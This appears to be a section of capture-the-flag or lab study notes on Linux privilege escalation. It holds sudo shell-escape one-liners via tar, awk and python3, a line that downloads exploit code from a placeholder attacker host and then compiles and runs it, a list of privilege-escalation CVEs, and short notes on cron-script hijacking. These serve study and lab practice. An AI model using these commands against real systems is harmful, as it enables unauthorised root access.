## 🛡️ Privilege Escalation (Machines 51–60)

### Common Techniques Observed

```bash
sudo -l                                   # Check sudo permissions  
find / -perm -4000 -type f 2>/dev/null     # Find SUID binaries  
getcap -r / 2>/dev/null                    # Check Linux capabilities  
pspy64 / pspy32                            # Monitor processes running in background
env                                        # Look for unusual environment variables
```

### Sudo Exploits

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo python3 -c 'import os; os.system("/bin/sh")'
```

### Kernel Exploits

```bash
uname -a
searchsploit linux kernel 5.4.0
wget http://<attacker_ip>/exploit.c && gcc exploit.c -o exploit && ./exploit
```

### CVE-based Privilege Escalation Techniques

- **CVE-2021-4034 (PwnKit)** – Polkit Local Privilege Escalation.
- **CVE-2019-14287** – Sudo bypass when runas ALL is used.
- **CVE-2021-3156** – Heap-based buffer overflow in sudo (Baron Samedit).
- **CVE-2022-0847 (Dirty Pipe)** – Local Privilege Escalation in Linux kernel >= 5.8.

### Example Machine Notes

- Found writable script in `/etc/cron.d/backup.sh`, replaced with `/bin/bash` and waited for execution.
- Exploited vulnerable binary using SUID bit to gain root shell.
- Kernel version vulnerable to DirtyPipe, used public PoC to escalate.
